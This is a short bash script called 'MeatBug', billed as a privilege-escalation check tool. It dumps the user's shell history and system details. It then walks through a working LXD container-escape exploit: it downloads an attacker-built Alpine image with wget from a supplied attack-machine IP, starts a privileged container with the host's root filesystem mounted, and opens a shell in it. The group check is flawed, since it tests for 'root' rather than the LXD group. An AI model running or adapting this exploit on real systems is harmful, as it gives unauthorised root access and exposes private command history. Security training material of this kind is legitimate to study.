#!/bin/bash

NAME="MeatBug"
VERSION="0.1"
ADVISORY="This is a simple privesc check tool"

figlet $NAME $VERSION
echo -e $ADVISORY "\n"

#Show who am I and if I have root access
CurrentUser=$(whoami)
echo "1) You are" $CurrentUser
if [ $CurrentUser == "root" ]; 
then
	echo -e "    Hey wait, you already have full access to the system! \n"
else
	echo "You are" $CurrentUser
fi

#Show current working directory
CurDir=$(pwd)
echo -e "2) You are currently at" $CurDir "\n"

#Show User Bash History
History=$(cat ~/.zsh_history)
echo "3) The commands you have previously typed in the console are the following:"
for line in $History
do
	echo -e "$line"
done

echo 

#Show System Information
echo "4) The system you are is named" $(hostname)"." "More information can be found bellow:"
echo "    a)" $(uname -a)
echo "    b)" $(lsb_release -a)
echo "    c)" $(hostnamectl | grep Kernel)

echo

#Check and exploit LXC/LXD Privilege Escalation Vector
echo "5) Checking of you can exploit the LXC/LXD misconfiguration:"
if $(id | grep 'root' -q);
then
	echo $(whoami) "is a member of the LXD group. You can try to exploit that configuration to obtain root privileges."
	read -p "Do you want to try to exploit the system? Answer with 'Yes' to procceed or insert anything else to skip." answer
	echo $answer
	if [ $answer == "Yes" ];
	then
		cd /tmp
		echo "Important!!!"
		echo "Run the following commands to your attack machine:"
		echo "    1) git clone  https://github.com/saghul/lxd-alpine-builder.git"
		echo "    2) cd lxd-alpine-builder"
		echo "    3) ./build-alpine"
		echo "    4) python3 -m http.server"
		read -p "Provide the IP Address of the Attack Machine" IP
		read -p "Provide the full name of the compressed file that corresponds to the built Alpine image" alpine
        figlet Exploiting LXD!
        wget http://$IP:8000/$alpine	
        lxc image import ./$alpine --alias pwner
        lxc image list
        lxc init pwner pwner -c security.privileged=true
        lxc config device add pwner mydevice disk source=/ path=/mnt/root recursive=true
        lxc start pwner
        echo "In the newly spawned command prompt remove the giberrish characters to properly run commands"
        lxc exec pwner /bin/sh
    else
    	echo "Procceeding with further enumeration"
    fi 
else
	echo "Your current user" "("$(whoami)")" "is not a member of the LXD group. Try looking for other Privilege Escalation Vectors."
fi